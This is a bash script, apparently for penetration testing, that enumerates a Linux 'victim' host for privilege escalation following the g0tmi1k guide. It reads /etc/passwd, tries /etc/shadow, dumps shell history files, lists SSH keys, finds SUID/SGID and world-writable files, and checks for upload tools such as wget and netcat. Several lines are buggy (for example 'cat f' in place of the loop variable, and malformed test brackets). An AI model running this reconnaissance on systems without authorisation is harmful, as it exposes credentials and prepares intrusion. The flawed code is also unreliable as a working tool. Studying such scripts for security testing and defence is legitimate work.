#!/usr/bin/bash

# based on https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
# Mainly info gathering- report special SUID/GUID files etc etc
# Could download directly to victim if permissions allow or simply copy and paste into terminal hosting the connection to the victim

# main categories according to g0tmi1k for linux:
# Operating System
# Applications & Services
# Communications & Networking
# Confidential Information & Users
# File Systems
# Preparation & Finding Exploit

echo -e "\e[31mOS - The Distribution\e[0m" ; cat /etc/issue /etc/*-release

echo -e "\e[31mOS - The Kernel Version\e[0m"
if [[ $( cat /proc/version )=="" ]]; then uname -a || rpm -q kernel ; fi

echo -e "\e[31mOS - Environment Variables\e[0m" && env 

echo -e "\e[31mApps & Services - Services With User Privileges\e[0m" ; ps aux
if [[ $( ps aux | grep "root" )!="" ]]; then echo "Services running under root: " ; ps aux | grep "root" ; fi

echo -e "\e[31mApps & Services - Installed Apps\e[0m" ; echo "User binaries:" && ls -al /usr/bin/ ; echo "System Binaries:" && ls -al /sbin/
if [[ "$?" -ne 0 ]]; then rpm -qa || dpkg -l ; fi

echo -e "\e[31mApps & Services - Misconfigured Services\e[0m" 
files=("/etc/syslog.conf" "/etc/chttp.conf" "/etc/cups/cupsd.conf" "/etc/inetd.conf" "/etc/apache2/apache2.conf" "/etc/my.conf" "/etc/httpd/conf/httpd.conf" "/opt/lampp/etc/httpd.conf")
for f in "${files[@]}"; do echo f && cat f ; done

echo -e "\e[31mApps & Services - Cronjobs\e[0m"
crontab -l && echo "Other cronjob information:" && cat /etc/cron*

echo -e "\e[31mComm & Networking - NICs\e[0m" && /sbin/ifconfig -a || cat /etc/network/interfaces /etc/sysconfig/network
echo -e "\e[31mComm & Networking - Network Config\e[0m"
echo -e "\e[31mDomain name:\e[0m" && dnsdomainname ; echo -e "\e[31mHost name:\e[0m" && hostname
echo -e "\e[31mNameservers:\e[0m" && cat /etc/resolv.conf
echo -e "\e[31mDefault destinations for default, loopback and link-local interfaces:\e[0m" && cat /etc/networks

echo -e "\e[31mComm & Networking - Other Hosts\e[0m"
cat /etc/services ; netstat -antup || chkconfig --list

echo -e "\e[31mConfidential Info & users\e[0m"
whoami ; id 
echo -e "\e[31mSystem users:\e[0m" && cat /etc/passwd | cut -d: -f1
cat /etc/shadow || echo "Insufficient permissions to read /etc/shadow"
echo -e "\e[31mMail directory\e[0m" && ls -al /var/mail ; echo -e "\e[31mHome directory of current user:\e[0m" && ls -al ~
history=$( ls -a ~ | grep "history" )
for file in "${history[@]}"; do echo "${file}" && cat "${file}" ; done
if ls -a | grep ".ssh";then ls -al ~/.ssh ; fi

echo -e "\e[31mFile systems\e[0m"
echo -e "\e[31mContents of var:\e[0m" && ls -al /var /var/log /var/spool /var/lib /var/www
echo -e "\e[31mMounted filesystems:\e[0m" && df -h ; echo -e "\e[31mUnmounted filesystems:\e[0m" && cat /etc/fstab
echo -e "\e[31mFiles with sticky bit:\e[0m" && find / -perm -1000 -type d 2>/dev/null 
echo -e "\e[31mFiles run as group, not user:\e[0m" && find / -perm -g=s -type f 2>/dev/null
echo -e "\e[31mFiles run as owner, not user:\e[0m" && find / -perm -u=s -type f 2>/dev/null
echo -e "\e[31mWorld writeable files:\e[0m" && find / -writable 2>/dev/null
echo -e "\e[31mWorld executable files:\e[0m" && find / -perm -o x 2>/dev/null
echo -e "\e[31mFiles with no owner:\e[0m" && find / -xdev \( -nouser -o -nogroup \) -print

echo -e "\e[31mPrepare & Find Exploit Code\e[0m"
tools=("perl*" "python*" "gcc*" "cc") ; upload=("wget" "nc*" "netcat*" "tftp*" "ftp")
echo -e "\e[31mSupported Languages:\e[0m" && for t in "${tools[@]}" ; do 
	if [[ $( find / -name "${t}" 2>&1 /dev/null )!="" ]]; then echo "$t is present." ; fi
done
echo -e "\e[31mMethods of upload:\e[0m" && for u in "${upload[@]}" ; do 
	if [[ $( find / -name "${u}" 2>&1 /dev/null )!="" ]]; then echo "$u is present." ; fi 
done
echo "Points not tested: port forwarding, SSH tunnelling and packet sniffing (check if no luck with any of the above!)"
exit 0
